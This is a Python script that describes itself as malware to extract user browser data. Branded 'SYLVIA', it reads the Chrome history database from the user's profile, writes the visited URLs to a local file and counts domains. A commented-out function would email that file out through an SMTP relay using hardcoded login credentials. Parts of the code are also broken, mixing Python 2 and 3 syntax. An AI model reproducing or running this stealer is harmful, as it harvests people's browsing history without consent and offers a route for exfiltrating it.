# a malware to extract user browser data.
import os
import sqlite3
import operator
import matplotlib.pyplot as plt
from collections import OrderedDict
from pyfiglet import Figlet
import sys
import time
import smtplib
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def load_animation4():
    load_str = 'Presenting Refined Result'
    ls_len = len(load_str)

    animation = "|/-\|"
    anicount = 0
    counttime = 0
    i = 0

    while (counttime!=100):
        time.sleep(0.1)

        load_str_list=list(load_str)
        x = ord(load_str_list[i])
        y = 0

        if x !=32 and x !=46:
            if x>90:
                y = x-32
            else:
                y = x+32
            load_str_list[i] = chr(y)

        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        sys.stdout.write("\r"+res+animation[anicount])
        #sys.stdout.flush()

        load_str = res
        anicount = (anicount + 1)%4
        i = (i+1)%ls_len
        counttime=counttime+1


def load_animation3():
    load_str = "Chrome Browser data found at C:\\Users\\Praful\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
    ls_len = len(load_str)

    animation = "|/-\|"
    anicount = 0
    counttime = 0
    i = 0

    while (counttime!=100):
        time.sleep(0.075)

        load_str_list=list(load_str)
        x = ord(load_str_list[i])
        y = 0

        if x !=32 and x !=46:
            if x>90:
                y = x-32
            else:
                y = x+32
            load_str_list[i] = chr(y)

        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        sys.stdout.write("\r"+res+animation[anicount])
        #sys.stdout.flush()

        load_str = res
        anicount = (anicount + 1)%4
        i = (i+1)%ls_len
        counttime=counttime+1

def load_animation2():
    load_str = 'Extracting browser history data'
    ls_len = len(load_str)

    animation = "|/-\|"
    anicount = 0
    counttime = 0
    i = 0

    while (counttime!=100):
        time.sleep(0.075)

        load_str_list=list(load_str)
        x = ord(load_str_list[i])
        y = 0

        if x !=32 and x !=46:
            if x>90:
                y = x-32
            else:
                y = x+32
            load_str_list[i] = chr(y)

        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        sys.stdout.write("\r"+res+animation[anicount])
        #sys.stdout.flush()

        load_str = res
        anicount = (anicount + 1)%4
        i = (i+1)%ls_len
        counttime=counttime+1


def load_animation():
    load_str = 'Starting up slyvia the theif.....'
    ls_len = len(load_str)

    animation = "|/-\|"
    anicount = 0
    counttime = 0
    i = 0

    while (counttime!=100):
        time.sleep(0.075)

        load_str_list=list(load_str)
        x = ord(load_str_list[i])
        y = 0

        if x !=32 and x !=46:
            if x>90:
                y = x-32
            else:
                y = x+32
            load_str_list[i] = chr(y)

        res = ''
        for j in range(ls_len):
            res = res + load_str_list[j]

        sys.stdout.write("\r"+res+animation[anicount])
        #sys.stdout.flush()

        load_str = res
        anicount = (anicount + 1)%4
        i = (i+1)%ls_len
        counttime=counttime+1


if __name__ == '__main__':

    #load_animation()
    #load_animation2()
    #load_animation3()


    '''def data_loader():
        port = 2525
        smtp_server = "smtp.mailtrap.io"
        login = '88b3847ff116bf' # paste your login generated by Mailtrap
        password = 'f9ba7a1dba1ca1' # paste your password generated by Mailtrap

        subject = "An example of boarding pass"
        sender_email = "jason8re@gmail.com"
        receiver_email = "jason8re@gmail.com"

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject

        # Add body to email
        body = "This is the data"
        message.attach(MIMEText(body, "plain"))

        filename = "myfile.txt"
        # Open PDF file in binary mode

        # We assume that the file is in the directory where you run your Python script from
        with open(filename, "rb") as attachment:
            # The content type "application/octet-stream" means that a MIME attachment is a binary file
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

        # Encode to base64
        encoders.encode_base64(part)

        # Add header
        part.add_header(
            "Content-Disposition",
            f "attachment; filename= {'myfile.txt'}",
        )

        # Add attachment to your message and convert it to string
        message.attach(part)
        text = message.as_string()

        # send your email
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(login, password)
            server.sendmail(sender_email, receiver_email, text)
            server.exit()
        print('Sent')'''








    f = Figlet(font='slant')
    print(f.renderText('SYLVIA'))


    def parse(url):
        try:
            parsed_url_components = url.split('//')
            sublevel_split = parsed_url_components[1].split('/',1)

            separator = '\n'
            datae = separator.join(sublevel_split)


            file1 = open("myfile.txt","a")#append mode
            file1.write(datae)
            file1.close()
            print(sublevel_split)
            domain = sublevel_split[0].replace("www.","")
            return domain
        except IndexError:
            print("URL format Error")

    def analyze(results):
    	prompt = raw_input("[.] Press C to obtain refined results  ")
        #load_animation4()

    	if prompt == "c":
    		for site, count in sites_count_sorted.items():
    			print(site, count)





    pathd = os.path.expanduser('~')+"\AppData\Local\Google\Chrome\User Data\Default"
    filed = os.listdir(pathd)
    hist_db = os.path.join(pathd, 'history')

    c = sqlite3.connect(hist_db)
    curs = c.cursor()
    select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
    curs.execute(select_statement)

    results = curs.fetchall()

    #print(results)

    sites_count = {}

    for url, count in results:
        url = parse(url)
        if url in sites_count:
            sites_count[url]+=1
        else:
            sites_count[url]=1

    sites_count_sorted = OrderedDict(sorted(sites_count.items(), key=operator.itemgetter(1), reverse=True))

    analyze(sites_count_sorted)
    #data_loader()
